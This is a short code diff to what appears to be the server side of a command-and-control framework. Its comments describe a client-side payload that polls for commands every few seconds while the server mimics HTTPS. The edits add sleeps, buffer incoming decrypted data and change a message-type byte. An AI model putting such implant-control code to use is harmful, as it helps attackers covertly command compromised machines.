@@ -31,7 +31,7 @@ class ClientComponents:
                 self.thread             = None
                 self.status             = "Active"
                 self.in_use             = False
-                self.pending            = None
+                self.pending            = b""
 
         # The payload executing on the client requests a new command every 2-9
         # seconds. To keep the look of a real HTTPS sever, we must respond to
@@ -41,9 +41,11 @@ class ClientComponents:
         def slake(self) -> None:
                 while self.status == "Active":
                         if self.in_use:
+                                time.sleep(0.1)
                                 continue
 
                         if not self.peek():
+                                time.sleep(0.1)
                                 continue
 
                         self.ack()
@@ -57,10 +59,10 @@ class ClientComponents:
                         cipher                  = self.connection.recv(length)
                         data                    = Payload.decrypt(cipher, self.key)
 
-                        if data[0] != 0x02:
+                        if data[0] != 0x03:
                                 continue
 
-                        self.pending            = data[1:]
+                        self.pending           += data[1:]
 
         @Private.Method
         def peek(self) -> bool:
